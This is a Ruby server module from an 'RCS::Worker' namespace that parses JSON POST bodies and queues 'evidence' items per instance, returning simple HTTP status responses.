#
#  HTTP requests parsing module
#

# relatives
require_relative 'queue_manager'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/mime'

# system
require 'json'

module RCS
module Worker

module Parser
  include RCS::Tracer
  
  STATUS_OK = 200
  STATUS_NOT_FOUND = 404
  
  # parse a request from a client
  def http_parse(http_headers, req_method, req_uri, req_cookies, req_content)
    
    # safe value
    resp_status = STATUS_NOT_FOUND
    resp_content_type = 'text/html'
    resp_content = 'there is nothing here!'
    
    content = JSON.parse(req_content)
    trace :debug, "Content: #{content}"
    
    begin
      content.each_pair do |instance, evidences| evidences.each {|ev| QueueManager.instance.queue(instance, ev)} end
    rescue Exception => e
      trace :error, "ERROR: " + e.message
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return resp_status, resp_content, resp_content_type
    end
    
    # check this is a POST, we don't accept anything else
    if req_method == 'POST'
      resp_status = STATUS_OK
      resp_content_type = 'text/html'
      resp_content = 'OK'
    end
    
    return resp_status, resp_content, resp_content_type
  end
  
  # returns the JSON parsed object containing the parameters passed to a POST or PUT request
  def http_parse_parameters(content)
    begin
      # in case the content is binary and not a json document
      # we will catch the exception and return the empty hash {}
      return JSON.parse(content)
    rescue
      return {}
    end
  end
  
end #Parser

end #Worker::
end #RCS::
